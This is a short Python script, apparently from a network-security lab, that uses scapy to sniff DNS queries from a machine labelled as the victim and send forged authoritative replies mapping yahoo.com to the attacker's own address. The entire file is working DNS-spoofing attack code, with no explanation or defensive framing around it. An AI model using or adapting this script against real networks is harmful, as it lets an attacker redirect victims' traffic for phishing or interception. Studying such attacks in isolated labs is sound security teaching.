#!/usr/bin/env python3

from ntpath import join
from socket import timeout
from struct import pack
from scapy.all import *
from scapy.layers.inet import IP, UDP, TCP, ICMP
from scapy.layers.dns import *
import sys

THIS_IP = "192.168.100.129"
VICTIM_IP = "192.168.100.128"

THIS_IP_B = b'192.168.100.129'

#packet_filt = " and ".join([
#"udp dst port 53", # dns port filtering
#"udp[10] & 0x80 = 0", # dns only
#"src host 192.168.59.3"]) # ip source	

packet_filter = f"udp dst port 53 and ip src {VICTIM_IP}"


def dns_reply(packet): 
	print("received")
	if not packet.haslayer(UDP):
		return
	if packet[DNS].qd.qname != b'yahoo.com.':
		return
	packet.show()
	returnPack = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd,ancount=1,aa=1,qr=1 ,an=DNSRR(ttl=100, rrname=packet[DNS].qd.qname, rdata=THIS_IP))
	print("sending: ")
	returnPack.show()
	send(returnPack, iface="ens33")

print(packet_filter)
print("started sniffing")
sniff(filter = packet_filter,prn = dns_reply, store=0, iface="ens33")

#,rdlen=len(THIS_IP)